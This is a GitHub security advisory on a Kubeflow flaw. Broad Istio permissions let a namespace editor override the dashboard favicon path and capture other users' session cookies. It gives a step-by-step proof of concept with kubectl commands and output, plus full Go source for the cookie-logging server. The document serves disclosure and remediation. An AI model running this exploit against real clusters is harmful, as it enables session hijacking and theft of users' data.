    Overly Permissive Istio Permissions Allows Kubeflow Authorization Token Stealing

    High
    juliusvonkohout published GHSA-v824-8gxh-pgjw May 19, 2026

    Package

    kubeflow manifests (kubernetes)

    Affected versions

    1.9.1 and older (at least since [Sep 26, 2019](https://github.com/kubeflow/manifests/commit/806766e0013ebfe7e60ab7f8d66b24cd5e532550))

    Patched versions

    None

    Description

    Overly Permissive Istio Permissions Allows Kubeflow Authorization Token Stealing

    This issue was fixed with the pull request !3043 on March 8th, 2025.

    Brief Summary

    A Kubeflow setup based on the official manifests or most other packaged Kubeflow distributions is vulnerable to authorization token stealing from any user of the Kubeflow UI or APIs, such as the Dashboard, Pipelines API, or Notebooks. With this token, the attacker can take over the user's account and the data that is processed by that user. The attacker needs a valid user with the kubeflow-edit role / Contributor role in a random Kubeflow namespace to perform this attack. This is given if Automatic Profile Creation is enabled.

    Description

    The Istio Virtual Service permission allows Kubeflow authorization token stealing.

    The default-editor service account in the Kubeflow namespaces has broad permissions on the Istio API group networking.istio.io. This allows the account to create Istio VirtualServices on any Istio Gateway in the cluster.

    Thus, an attacker can create a VirtualServices on the Kubeflow gateway and overwrite existing paths on the Kubeflow site, which includes components like the Dashboard, Pipelines API, or Notebooks.

    With this, an attacker can hijack the sessions of any Kubeflow user. First, the attacker overrides a path to a resource file loaded by the victim and redirects the requests to an attacker-controlled Pod. An easy and reliable way to do this is to overwrite the favicon as it is loaded by every browser client when visiting the Dashboard or Notebooks. Then, they can log the session cookies of the requests in the Pod and thus take over the users' sessions.

    However, one obstacle is in the way as the default AuthorizationPolicy in the attacker-controlled namespace would reject requests from users who are not members of the Kubeflow namespace. The attacker can address this by adding the victim's email address to the list of Contributors in the attacker-controlled namespace. They do not need to know the email addresses of their victims, as they can use wildcards to add all users from a given domain.

    Prerequisites for the Attack

    • A Kubeflow setup based on the official manifests (or any affected distribution)
    • The attacker needs either
      • a valid user with the Contributor role in one random Kubeflow namespace
      • or the K8s role kubeflow-edit / ServiceAccount default-editor in one random Kubeflow namespace
      • or Automatic Profile Creation is enabled (CD_REGISTRATION_FLOW=true), and the attacker can authenticate

    Please note: While the Owner role is required to add the victims to the attacker-controlled namespace as Contributor, it is not a prerequisite for the attack as the Owner's token can be stolen during the attack to perform this step.

    Impact

    With the given permission in the Istio's API group networking.istio.io of the kubeflow-edit role, the attacker gains full control over the requests/responses routed through the Gateway kubeflow/kubeflow-gateway. In result, the access token of all users will be disclosed to the attacker. Thus, the attacker gains full control over the users' data and resources in Kubeflow.

    Proof of Concept

    The following descriptions explain the exploitation of the issue in detail. The proof of concept (PoC) was done in a Kubeflow setup installed through the official manifests in version v1.9.1. No modifications were made except for the creation of additional users and namespaces. The namespaces were created through the Automatic Profile Creation feature, which was enabled, too (CD_REGISTRATION_FLOW=true). However, the feature is not required, and a manually created profile / the default profile works, too.

    The PoC should work on the master branch, too, as the same permissions are given.

    Step 1: Create a New JupyterLab Notebook

    At first, the attacker creates a new JupyterLab Notebook via the New Notebook function under Notebooks; see screenshot below.

    Step 2: View Default Permissions

    Using the Jupyter Notebook, we can examine the permissions the service account of the Notebook has per default. The command kubectl auth whoami shows the username system:serviceaccount:ernw-de-ext:default-editor with the default role ClusterRole/kubeflow-edit. The command kubectl auth can-i --list shows the permissions this user has assigned in the current namespace. Note that the user has permission to create and update resources in API group *.istio.io and *.networking.istio.io. With those permissions, the user can create a VirtualService on the kubeflow/kubeflow-gateway even though it is deployed in a different namespace.

    Step 3: Create a VirtualService

    A Docker image with a web application was created to hijack the sessions of other Kubeflow users in the cluster. This image logs requests with all headers (see docker-image in attachments).

    Next, the attacker creates a deployment with that image and a VirtualService. In the given PoC, the namespace ernw-de-ext is used. This can be done via the command kubectl apply -f k8s-resource.yaml. The file k8s-resources.yaml contains all relevant resources required for the exploit.

    (base) jovyan@ernw-de-ext-notebook-0:~$ kubectl apply -f k8s-resource.yaml 
virtualservice.networking.istio.io/ernw-virtualservice-poc created
destinationrule.networking.istio.io/ernw-virtualservice-poc-dr created
service/ernw-virtualservice-poc created
configmap/ernw-virtualservice-poc created
deployment.apps/ernw-virtualservice-poc created

    With the command kubectl get pods, the newly created Pods can be shown:

    (base) jovyan@ernw-de-ext-notebook-0:~$ kubectl get pods
NAME                                              READY   STATUS    RESTARTS   AGE
ernw-de-ext-notebook-0                            2/2     Running   0          59m
ernw-virtualservice-poc-7649d4d497-lhfcd          1/2     Running   0          9s
ml-pipeline-ui-artifact-6b44b849d7-mvdw7          2/2     Running   0          94m
ml-pipeline-visualizationserver-5fcb5568f-r522d   2/2     Running   0          94m

    The newly created VirtualService overrides the path /assets/favicon.ico that is requested by every user who uses the Kubeflow Dashboard.

    Step 4: Add User to Manage Contributors List

    Currently, one obstacle is the default AuthorizationPolicy in the attacker-controlled namespace, which would reject requests from users who are not members of the Kubeflow namespace. Next, we need to add our victim's email address to the Manage Contributors list in the Kubeflow UI so that the victim can access the favicon.

    Please note that this step requires the Owner role in the attacker-controlled namespace ernw-de-ext. If the attacker only has the Contributor role or default-editor service account token, they need to steal the Owner's token first (see next step) and then perform this step with it.

    The attacker does not need to know the email addresses of his victims, as they can use wildcards to add all users from a given domain. The following screenshot shows this.

    Kubeflow adjusts the corresponding AuthorizationPolicy, as can be seen in the following output:

    [...]

    The complete AuthorizationPolicy is attached as authorization-policy-with-wildcard.yaml.

    The victim can now access the routes defined in the VirtualService.

    Step 5: Steal Users' Sessions

    Every time a victim visits the Kubeflow UI, the favicon is loaded, and the request with the cookie is forwarded to the attacker-controlled Pod. The screenshot shows the replaced favicon in the browser's title bar.

    Afterwards, the following kubectl logs command can be used on the Pod to retrieve the stolen users' cookies.

    kubectl logs deployment.apps/ernw-virtualservice-poc --follow

    The kubeflow-favicon-hijacking-logs.txt shows some logged cookies.

    The attacker can now set the cookie in their browser to take over the victim's session. This is demonstrated in the HTTP communication documented in the file check-if-stole-token-matches-the-user-example.txt.

    Recommendation

    The permissions to the API groups networking.istio.io and istio.io should be removed from the ClusterRoles kubeflow-edit and kubeflow-admin in default.

    package main

import (
	"fmt"
	"log"
	"mime"
	"net/http"
	"net/http/httputil"
	"os"
    "strconv"
)

const defaultPort = 8888

func health(w http.ResponseWriter, req *http.Request) {
	log.Printf("Health check from %s", req.RemoteAddr)
	fmt.Fprintf(w, "ok\n")
}

func logMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.RequestURI == "/assets/favicon.ico" || r.RequestURI[len(r.RequestURI)-1:] == "/" {
			dump, err := httputil.DumpRequest(r, false)
			if err != nil {
				log.Printf("Error handling request from %s: %v", r.RemoteAddr, err)
			}
			log.Printf("Request to favicon.ico from %s:\n%s\n\n", r.RemoteAddr, dump)
		}

		next.ServeHTTP(w, r)
	})
}

func logData(w http.ResponseWriter, req *http.Request) {
	defer req.Body.Close()

	dump, err := httputil.DumpRequest(req, true)
	if err != nil {
		log.Printf("Error processing request body from %s: %v", req.RemoteAddr, err)
	}
	log.Printf("Got data from %s:\n%s\n\n", req.RemoteAddr, dump)

	w.WriteHeader(200)
	w.Header().Add("Content-Type", "text/plain")
	fmt.Fprintf(w, "ok\n")
}

func config(w http.ResponseWriter, req *http.Request) {
	log.Printf("Read config from %s", req.RemoteAddr)
	w.Header().Add("Content-Type", "application/json")
	data := os.Getenv("POC_WEBSERVER_CFG")
	if data == "" {
		data = `{"url":"/api/workgroup/env-info"}`
	}
	fmt.Fprintf(w, "%s\n", data)
}

func registerRoutes(prefix string, mux *http.ServeMux) {
	static_path := os.Getenv("POC_WEBSERVER_STATIC_PATH")
	if static_path == "" {
		static_path = "./static"
	}

	if prefix == "" || prefix[0] != '/' {
		prefix = "/" + prefix
	}
	if prefix[len(prefix)-1:] != "/" {
		prefix = prefix + "/"
	}

	log.Printf("Exposing data from %s on %s\n", static_path, prefix)

	mux.HandleFunc(prefix+"api/healthz", health)
	mux.HandleFunc(prefix+"api/log", logData)
	mux.HandleFunc(prefix+"api/config", config)

	fsStatic := http.FileServer(http.Dir(static_path))
	mux.Handle(prefix, logMiddleware(http.StripPrefix(prefix, fsStatic)))
}

func main() {
	mime.AddExtensionType(".css", "text/css; charset=utf-8")
	mime.AddExtensionType(".js", "application/javascript; charset=utf-8")
	mime.AddExtensionType(".html", "text/html")

	mux := http.NewServeMux()

	registerRoutes("", mux)


	add_prefix := os.Getenv("NB_PREFIX")
	if add_prefix == "" {
		add_prefix = "/example"
	}

	port := defaultPort
	port_str := os.Getenv("PORT")
	if port_str != "" {
		port, _ = strconv.Atoi(port_str)
	}

	registerRoutes(add_prefix, mux)

	server := http.Server{
		Addr:    fmt.Sprintf(":%v", port),
		Handler: mux,
	}
	log.Printf("Listening on :%d...\n", port)
	err := server.ListenAndServe()
	if err != nil {
		log.Fatal(err)
	}
}
